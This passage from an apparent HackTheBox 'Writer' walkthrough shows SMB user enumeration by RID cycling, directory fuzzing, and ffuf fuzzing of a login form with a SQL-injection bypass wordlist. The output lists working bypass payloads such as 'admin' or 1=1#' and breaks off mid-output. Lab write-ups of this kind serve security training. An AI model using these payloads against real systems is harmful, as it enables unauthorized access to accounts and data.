(8)</span><br><span class="line">S-1-5-32-1004 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1005 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1006 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1007 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1008 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1009 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1010 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1011 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1012 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1013 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1014 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1015 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1016 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1017 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1018 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1019 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1020 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1021 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1022 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1023 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1024 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1025 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1026 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1027 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1028 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1029 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1030 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1031 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1032 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1033 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1034 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1035 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1036 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1037 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1038 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1039 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1040 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1041 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1042 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1043 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1044 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1045 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1046 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1047 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1048 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1049 *unknown*\*unknown* (8)</span><br><span class="line">S-1-5-32-1050 *unknown*\*unknown* (8)</span><br><span class="line"></span><br><span class="line"> ============================================= </span><br><span class="line">|    Getting printer info <span class="keyword">for</span> 10.10.11.101    |</span><br><span class="line"> ============================================= </span><br><span class="line">No printers returned.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Sun Aug  1 02:15:46 2021</span><br></pre></td></tr></table></figure>

<p>We have tons of information.<br>Especially the username using RID Cycling So let’s create a user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># cat user.txt </span></span><br><span class="line">kyle</span><br><span class="line">john</span><br><span class="line">nobody</span><br></pre></td></tr></table></figure>

<h3 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ smbmap -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> -R -H 10.10.11.101</span><br><span class="line">[+] IP: 10.10.11.101:445        Name: 10.10.11.101                                      </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        <span class="built_in">print</span>$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        writer2_project                                         NO ACCESS</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))</span><br></pre></td></tr></table></figure>

<p>Looks like annoymous login is no good as we can read any shares.</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Visiting-Website"><a href="#Visiting-Website" class="headerlink" title="Visiting Website"></a>Visiting Website</h3><p>Visiting the website it looks like a normal blog website</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2047.jpg"></li>
</ul>
<p>At the Bottom you can see a refference to writer.htb so let’s add it in &#x2F;etc&#x2F;hosts probably this is not required but it’s better to be safe.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2048.jpg"></li>
</ul>
<h3 id="Directory-Fuzzing"><a href="#Directory-Fuzzing" class="headerlink" title="Directory Fuzzing"></a>Directory Fuzzing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ ffuf -u http://10.10.11.101/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200 -c</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.11.101/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">about                   [Status: 200, Size: 3522, Words: 250, Lines: 75]</span></span><br><span class="line"><span class="string">administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35]</span></span><br><span class="line"><span class="string">contact                 [Status: 200, Size: 4899, Words: 242, Lines: 110]</span></span><br><span class="line"><span class="string">dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4]</span></span><br><span class="line"><span class="string">logout                  [Status: 302, Size: 208, Words: 21, Lines: 4]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">static                  [Status: 301, Size: 313, Words: 20, Lines: 10]</span></span><br><span class="line"><span class="string">:: Progress: [20469/20469] :: Job [1/1] :: 790 req/sec :: Duration: [0:00:28] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>Looks like we have few intresting directories.<br>let’s first visit administrative.</p>
<h3 id="Crawling-through-the-directories"><a href="#Crawling-through-the-directories" class="headerlink" title="Crawling through the directories"></a>Crawling through the directories</h3><p>Looks like a normal login page.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2049.jpg"></li>
</ul>
<p>&#x2F;dashboard redirects to the homepage and &#x2F;about has nothing intresting.<br>&#x2F;contact has the form looks like a dead form which requests with the get request but give 404 response.</p>
<p>So the only good enpoint is the &#x2F;administrative<br>we have the user so we can spray the password but before that let’s see if it has any sql injections.</p>
<h3 id="Sql-Injection"><a href="#Sql-Injection" class="headerlink" title="Sql-Injection"></a>Sql-Injection</h3><p>so I tried doing some basic sqlinjection payload at the login form.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ <span class="built_in">cat</span> r.txt </span><br><span class="line">POST /administrative HTTP/1.1</span><br><span class="line">Host: writer.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 26</span><br><span class="line">Origin: http://writer.htb</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://writer.htb/administrative</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=UNAME&amp;password=PASS</span><br></pre></td></tr></table></figure>

<p>The above request is captured by the burpsuite and UNAME and PASS are the names of the values to be fuzzed.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Writer$ ffuf -X POST -request r.txt -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt:UNAME -w /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt:PASS -t 200 -c -mode pitchfork -mc all -request-proto http -fs 790</span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"> :: Method           : POST</span></span><br><span class="line"><span class="string"> :: URL              : http://writer.htb/administrative</span></span><br><span class="line"><span class="string"> :: Wordlist         : UNAME: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt</span></span><br><span class="line"><span class="string"> :: Wordlist         : PASS: /usr/share/seclists/Fuzzing/SQLi/Login-Bypass.txt</span></span><br><span class="line"><span class="string"> :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span></span><br><span class="line"><span class="string"> :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string"> :: Header           : Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string"> :: Header           : Referer: http://writer.htb/administrative</span></span><br><span class="line"><span class="string"> :: Header           : Host: writer.htb</span></span><br><span class="line"><span class="string"> :: Header           : Origin: http://writer.htb</span></span><br><span class="line"><span class="string"> :: Header           : Connection: close</span></span><br><span class="line"><span class="string"> :: Header           : Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"> :: Header           : Accept-Language: en-US,en;q=0.5</span></span><br><span class="line"><span class="string"> :: Data             : uname=UNAME&amp;password=PASS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: all</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 790</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * PASS: &#x27;</span>or 1=1 or <span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span>or 1=1 or <span class="string">&#x27;&#x27;</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: admin&#x27;</span> or 1=1<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: admin<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: admin&#x27;</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: admin<span class="string">&#x27; #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 591, Words: 5, Lines: 1][0m</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2K    * UNAME: &#x27;</span> or 0=0 <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">[2K    * PASS: <span class="string">&#x27; or 0=0 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[32m</span></span><br><span class="line"><span class="string">[2K[Status: 200, Size: 